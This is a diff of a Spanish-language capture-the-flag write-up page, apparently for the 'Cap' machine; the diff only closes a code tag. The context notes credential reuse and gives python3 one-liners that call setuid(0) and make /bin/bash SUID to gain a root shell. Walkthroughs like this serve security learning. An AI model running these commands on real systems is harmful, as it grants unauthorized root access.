@@ -109,7 +109,7 @@
 <p> Podemos ver que existe una reutilizacion de credenciales</p>
 <p><img src="/img/Cap/14.PNG" /></p>
 <p> Ahora solo nos queda escalar privilegios , si buscamos permisos SUID en busca de ejecutar procesos del sistema como el usuario ROOT , podemos ver que con python3 va a ser posible</p>
-<code>python3 -c 'import os; os.setuid(0); os.system("whoami")'
+<code>python3 -c 'import os; os.setuid(0); os.system("whoami")' </code>
     <p><img src="/img/Cap/15.PNG" /></p>
     <p> Ya tenemos ejecucion de comandos mediante el usuario root por lo que nos queda crearnos una shell con permisos de root y ejecutarlo mediante el usuario nathan </p>
     <code>python3 -c 'import os; os.setuid(0); os.system("chmod +s /bin/bash")'</code>
